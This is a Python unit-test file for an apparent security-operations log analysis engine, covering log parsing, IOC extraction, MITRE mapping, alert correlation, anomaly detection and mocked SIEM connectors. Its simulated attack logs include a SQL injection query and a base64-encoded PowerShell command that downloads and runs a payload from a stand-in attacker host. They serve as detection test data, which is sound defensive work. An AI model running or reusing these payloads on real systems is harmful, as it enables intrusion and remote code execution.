# SecScan AI core module
"""
Unit tests for Advanced SOC Analysis Engine
"""

import pytest
from datetime import datetime, timedelta, timezone
from security.soc_analysis import (
    get_soc_analyzer,
    AdvancedSOCAnalyzer,
    LogFormat,
    ThreatSeverity,
    NormalizedLogEntry,
    IOCResult,
)


def _utc_now() -> datetime:
    return datetime.now(timezone.utc)


def test_get_soc_analyzer():
    """Verify that get_soc_analyzer returns an instance of AdvancedSOCAnalyzer."""
    analyzer = get_soc_analyzer()
    assert isinstance(analyzer, AdvancedSOCAnalyzer)
    assert analyzer.log_parser is not None
    assert analyzer.ioc_extractor is not None
    assert analyzer.mitre_mapper is not None
    assert analyzer.correlation_engine is not None
    assert analyzer.anomaly_detector is not None


def test_log_parser_formats():
    """Test auto-detection and parsing of various log formats."""
    analyzer = get_soc_analyzer()
    parser = analyzer.log_parser

    # 1. Syslog format
    syslog_line = "Jul 05 00:10:20 web-server sshd[12345]: Failed password for invalid user admin from 198.51.100.42 port 54321 ssh2"
    fmt = parser.detect_format(syslog_line)
    assert fmt == LogFormat.SYSLOG
    entry = parser.parse_line(syslog_line)
    assert entry.source == "syslog"
    assert "Failed password" in entry.message
    assert entry.pid == 12345

    # 2. JSON format
    json_line = '{"timestamp": "2026-07-05T00:10:20Z", "source": "test_agent", "src_ip": "192.168.1.100", "message": "unauthorized file access", "user": "guest"}'
    fmt = parser.detect_format(json_line)
    assert fmt == LogFormat.JSON
    entry = parser.parse_line(json_line)
    assert entry.source == "test_agent"
    assert entry.source_ip == "192.168.1.100"
    assert entry.user == "guest"
    assert entry.message == "unauthorized file access"

    # 3. Firewall format
    firewall_line = "Jul 05 00:11:00 firewall-core DROP SRC=198.51.100.42 DST=10.0.0.5 SPT=54320 DPT=80 PROTO=TCP"
    fmt = parser.detect_format(firewall_line)
    assert fmt == LogFormat.FIREWALL
    entry = parser.parse_line(firewall_line)
    assert entry.source == "firewall"
    assert entry.source_ip == "198.51.100.42"
    assert entry.destination_ip == "10.0.0.5"
    assert entry.source_port == 54320
    assert entry.destination_port == 80
    assert entry.protocol == "TCP"
    assert entry.action == "DROP"


def test_ioc_extraction():
    """Test extraction of indicators of compromise (IOCs)."""
    analyzer = get_soc_analyzer()
    extractor = analyzer.ioc_extractor

    sample_text = (
        "Malicious IP detected: 198.51.100.42. "
        "Also connecting to evil domain attacker.onion. "
        "File hash MD5 was 8b1a9953c4611296a827abf8c47804d7. "
        "Reference vulnerability CVE-2023-38606."
    )

    iocs = extractor.extract_all(sample_text)
    ioc_types = [i.ioc_type for i in iocs]
    ioc_values = [i.value for i in iocs]

    assert "ip" in ioc_types
    assert "198.51.100.42" in ioc_values

    assert "domain" in ioc_types
    assert "attacker.onion" in ioc_values

    assert "hash_md5" in ioc_types
    assert "8b1a9953c4611296a827abf8c47804d7" in ioc_values

    assert "cve" in ioc_types
    assert "CVE-2023-38606" in ioc_values

    # Test benign filtering (should have low confidence or be ignored)
    benign_text = "Checking Google at google.com and localhost IP 127.0.0.1"
    benign_iocs = extractor.extract_all(benign_text)
    # Check that google.com is classified as very low confidence or low threat
    google_iocs = [i for i in benign_iocs if "google.com" in i.value]
    if google_iocs:
        assert google_iocs[0].confidence < 0.3
        assert google_iocs[0].threat_score < 5.0


def test_mitre_mapping():
    """Test mapping of log entries and IOCs to MITRE ATT&CK techniques."""
    analyzer = get_soc_analyzer()
    mapper = analyzer.mitre_mapper

    # Test keyword mapping
    mappings = mapper.map_event("mimikatz credentials lsass dump")
    assert len(mappings) > 0
    assert mappings[0].technique_id == "T1003"
    assert mappings[0].tactic == "Credential Access"

    # Test ransomware keyword mapping
    mappings_ransomware = mapper.map_event("Warning: ransomware detected. files locked with extension .locked.")
    assert len(mappings_ransomware) > 0
    assert mappings_ransomware[0].technique_id == "T1486"

    # Test IOC mapping
    ioc = IOCResult(
        ioc_type="cve",
        value="CVE-2021-44228",
        context="log4j vulnerability",
        confidence=0.95
    )
    ioc_mappings = mapper.map_iocs([ioc])
    assert len(ioc_mappings) > 0
    assert ioc_mappings[0].technique_id == "T1190"


def test_correlation_engine():
    """Test alert correlation logic for brute force and port scans."""
    analyzer = get_soc_analyzer()
    correlation = analyzer.correlation_engine

    # 1. Simulate Brute force logs
    entries = []
    now = _utc_now()
    for idx in range(10):
        entries.append(NormalizedLogEntry(
            timestamp=now - timedelta(seconds=idx * 10),
            source="sshd",
            source_ip="198.51.100.42",
            destination_ip="10.0.0.5",
            source_port=54320 + idx,
            destination_port=22,
            protocol="TCP",
            action="FAIL",
            severity="high",
            message="Failed password for root",
            raw=f"sshd: Failed password for root from 198.51.100.42 port {54320+idx} ssh2",
        ))

    iocs = [IOCResult(ioc_type="ip", value="198.51.100.42", context="Failed password", confidence=0.85)]

    alerts = correlation.correlate(entries, iocs)
    assert len(alerts) > 0
    
    brute_force_alert = next((a for a in alerts if "Brute Force" in a.title), None)
    assert brute_force_alert is not None
    assert brute_force_alert.severity == ThreatSeverity.HIGH
    assert brute_force_alert.category == "Credential Access"
    assert len(brute_force_alert.source_events) >= 5
    assert len(brute_force_alert.iocs) > 0
    assert brute_force_alert.score > 60.0


def test_anomaly_detection():
    """Test statistical anomaly detection on logs."""
    from security.soc_analysis import AnomalyDetector
    # Set lower z-score threshold because 4 samples mathematically limit max z-score to 1.73
    detector = AnomalyDetector(z_score_threshold=1.5)

    # Create normal baseline logs (low volume, few errors)
    entries = []
    now = _utc_now()
    for idx in range(20):
        # Evenly spread over 4 hours
        ts = now - timedelta(hours=idx % 4, minutes=idx % 60)
        entries.append(NormalizedLogEntry(
            timestamp=ts,
            source="nginx",
            source_ip="192.168.1.50",
            destination_ip="10.0.0.5",
            source_port=12345,
            destination_port=80,
            protocol="TCP",
            action="ACCEPT",
            severity="info",
            message="GET /index.html HTTP/1.1 200 OK",
            raw=f"nginx GET /index.html 200",
        ))

    # Add a massive spike in a single hour to trigger a volume anomaly
    for idx in range(80):
        entries.append(NormalizedLogEntry(
            timestamp=now,
            source="nginx",
            source_ip="192.168.1.50",
            destination_ip="10.0.0.5",
            source_port=12345,
            destination_port=80,
            protocol="TCP",
            action="ACCEPT",
            severity="info",
            message="GET /index.html HTTP/1.1 200 OK",
            raw="nginx GET /index.html 200",
        ))

    anomalies = detector.detect_anomalies(entries)
    assert len(anomalies) > 0
    vol_anomaly = next((a for a in anomalies if a.metric_name == "event_volume_per_hour"), None)
    assert vol_anomaly is not None
    assert vol_anomaly.is_anomaly is True


def test_full_analysis_report():
    """Test full analysis pipeline integration and output structure."""
    analyzer = get_soc_analyzer()
    now = _utc_now()
    
    # Combined attack scenario: ssh brute force + web sql injection + powershell reverse shell
    raw_logs = f"""
{(now - timedelta(minutes=5)).strftime('%b %d %H:%M:%S')} core sshd[2233]: Failed password for admin from 198.51.100.42 port 5001 ssh2
{(now - timedelta(minutes=4)).strftime('%b %d %H:%M:%S')} core sshd[2233]: Failed password for admin from 198.51.100.42 port 5002 ssh2
{(now - timedelta(minutes=3)).strftime('%b %d %H:%M:%S')} core sshd[2233]: Failed password for root from 198.51.100.42 port 5003 ssh2
{(now - timedelta(minutes=2)).strftime('%b %d %H:%M:%S')} core sshd[2233]: Failed password for invalid user dbuser from 198.51.100.42 port 5004 ssh2
{(now - timedelta(minutes=1)).strftime('%b %d %H:%M:%S')} core sshd[2233]: Failed password for webadmin from 198.51.100.42 port 5005 ssh2
{now.strftime('%b %d %H:%M:%S')} web-server apache2: 198.51.100.42 - - "GET /search?q=1' UNION SELECT username,password FROM users -- HTTP/1.1" 200 4053
{now.strftime('%b %d %H:%M:%S')} local-host auditd: Execution of suspicious cmd powershell -enc aWV4IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2JhZGFjdG9yLm9uaW9uL3BheWxvYWQucHMnKQ==
Reference CVE-2021-44228 detected.
"""

    report = analyzer.analyze(raw_logs)
    
    # Basic report metadata assertions
    assert report.report_id is not None
    assert report.total_logs_processed == 8
    assert report.risk_score >= 4.0
    assert len(report.alerts) >= 2
    assert len(report.iocs) >= 2
    assert len(report.timeline) > 0
    assert len(report.playbooks) > 0
    
    # Check that key threats are detected
    alert_categories = [a.category for a in report.alerts]
    assert "Credential Access" in alert_categories
    assert "Execution" in alert_categories

    # Check playbook generation
    playbook_types = [p.incident_type for p in report.playbooks]
    assert "Credential Access" in playbook_types or "Execution" in playbook_types

    # Test serialization to dict
    report_dict = analyzer.to_dict(report)
    assert report_dict["report_id"] == report.report_id
    assert report_dict["total_logs_processed"] == 8
    assert isinstance(report_dict["alerts"], list)
    assert len(report_dict["alerts"]) > 0


def test_siem_connectors_mock():
    """Test Splunk, QRadar, Elasticsearch, and Webhook mock integrations."""
    from security.soc_analysis import (
        SplunkConnector,
        QRadarConnector,
        ElasticsearchConnector,
        WebhookConnector,
        SOCAlert,
        ThreatSeverity
    )
    import datetime

    # 1. Splunk mock testing
    splunk = SplunkConnector(name="test_splunk", url="https://splunk:8089", token="mock_token", is_mock=True)
    success, msg = splunk.test_connection()
    assert success is True
    assert "Splunk" in msg

    success, logs, msg = splunk.fetch_logs(query="failed", limit=2)
    assert success is True
    assert len(logs) == 2
    assert "Failed password" in logs[0]

    # Create a dummy alert to forward
    alert = SOCAlert(
        alert_id="alert-123",
        title="Brute Force",
        description="SSH brute force",
        severity=ThreatSeverity.HIGH,
        category="Credential Access",
        source_events=[],
        iocs=[],
        mitre_mappings=[],
        timestamp=_utc_now()
    )
    success, msg = splunk.forward_alert(alert)
    assert success is True

    # 2. QRadar mock testing
    qradar = QRadarConnector(name="test_qradar", url="https://qradar:443", token="mock_token", is_mock=True)
    success, msg = qradar.test_connection()
    assert success is True
    
    success, logs, msg = qradar.fetch_logs(query="unauthorized", limit=2)
    assert success is True
    assert len(logs) == 2
    assert "mimikatz" in logs[0]

    success, msg = qradar.forward_alert(alert)
    assert success is True

    # 3. Elasticsearch mock testing
    elastic = ElasticsearchConnector(name="test_elastic", url="http://elastic:9200", token="mock_token", is_mock=True)
    success, msg = elastic.test_connection()
    assert success is True
    
    success, logs, msg = elastic.fetch_logs(query="failed", limit=2)
    assert success is True
    assert len(logs) == 2

    success, msg = elastic.forward_alert(alert)
    assert success is True

    # 4. Webhook mock testing
    webhook = WebhookConnector(name="test_webhook", url="https://slack.webhook/...", token="", is_mock=True)
    success, msg = webhook.test_connection()
    assert success is True
    
    success, msg = webhook.forward_alert(alert)
    assert success is True


def test_siem_manager():
    """Test SIEMConnectorManager registration, connection testing, and routing."""
    from security.soc_analysis import (
        SIEMConnectorManager,
        SplunkConnector,
        QRadarConnector,
        SOCAlert,
        ThreatSeverity
    )
    import datetime

    manager = SIEMConnectorManager()
    
    splunk = SplunkConnector(name="splunk_prod", url="https://splunk:8089", token="mock", is_mock=True)
    qradar = QRadarConnector(name="qradar_prod", url="https://qradar:443", token="mock", is_mock=True)

    manager.register_connector("splunk", splunk)
    manager.register_connector("qradar", qradar)

    assert manager.get_connector("splunk") == splunk
    assert manager.get_connector("qradar") == qradar

    # Test all connections
    results = manager.test_all()
    assert results["splunk"][0] is True
    assert results["qradar"][0] is True

    # Forward alert to all
    alert = SOCAlert(
        alert_id="alert-999",
        title="SQL Injection",
        description="Exploit attempt",
        severity=ThreatSeverity.CRITICAL,
        category="Exploitation",
        source_events=[],
        iocs=[],
        mitre_mappings=[],
        timestamp=_utc_now()
    )
    forward_results = manager.forward_alert_to_all(alert)
    assert forward_results["splunk"][0] is True
    assert forward_results["qradar"][0] is True

